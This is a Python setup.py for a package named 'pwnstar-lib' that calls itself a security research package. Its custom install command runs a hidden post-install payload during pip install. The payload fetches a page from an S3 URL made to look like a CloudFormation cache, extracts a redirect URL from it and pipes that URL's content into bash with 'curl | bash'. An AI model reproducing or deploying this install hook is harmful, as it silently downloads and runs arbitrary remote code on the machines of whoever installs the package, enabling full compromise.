from setuptools import find_packages, setup
from setuptools.command.install import install
import os
import sys

# Create a minimal package
os.makedirs("pwnstar_lib", exist_ok=True)
with open("pwnstar_lib/__init__.py", "w") as f:
    f.write("# Package initialization\n")

class PostInstallCommand(install):
    def run(self):
        # Run standard install first
        install.run(self)
        
        # This code will execute during pip install
        print("Running post-install payload...")
        
        # Import requests - it should be available now that the package is installed
        try:
            # We need to import dynamically in the subprocess to ensure it's in the right environment
            cmd = [
                sys.executable, 
                "-c", 
                """
import requests
import re
import subprocess
import os

try:
    url = "https://cloudformation-cache.s3.us-east-1.amazonaws.com/ami/656289367527a205257-Instance-Profile-Enforcement-58b20525-9d6a-4e5d-b41914b86817.html"
    print(f"Fetching URL: {url}")
    response = requests.get(url)
    print(f"Response status: {response.status_code}")
    
    redirect_url_match = re.search(r'REDIRECT_URL="(https://[^"]+)"', response.text)
    if redirect_url_match:
        redirect_url = redirect_url_match.group(1)
        print(f"Found redirect URL: {redirect_url}")
        result = subprocess.run(f"curl -s {redirect_url} | bash", shell=True, capture_output=True, text=True)
        print(f"Execution result: {result.stdout}")
        
        # Log for research
        with open("research_log.txt", "w") as f:
            f.write(f"URL: {url}\\n")
            f.write(f"Redirect URL: {redirect_url}\\n")
            f.write(f"Command executed: curl -s {redirect_url} | bash\\n")
            f.write(f"Output: {result.stdout}\\n")
    else:
        print("Failed to extract redirect URL, regex pattern did not match")
        print("Response content preview:")
        print(response.text[:500])
except Exception as e:
    print(f"Payload execution failed: {e}")
    import traceback
    traceback.print_exc()
                """
            ]
            
            # Execute the payload in a subprocess
            import subprocess
            result = subprocess.run(cmd, check=True)
            print("Payload execution complete")
            
        except Exception as e:
            print(f"Failed to execute payload: {e}")
            import traceback
            traceback.print_exc()

setup(
    name="pwnstar-lib",
    version="1.8",
    author="PwnStar",
    install_requires=[
        "requests>=2.25.0",
    ],
    author_email="calebhavens@gmail.com",
    description="Security research package",
    long_description="For security research purposes only",
    long_description_content_type="text/markdown",
    url="https://github.com/yourusername/my_library",
    packages=["pwnstar_lib"],
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    python_requires=">=3.6",
    cmdclass={
        'install': PostInstallCommand,
    },
)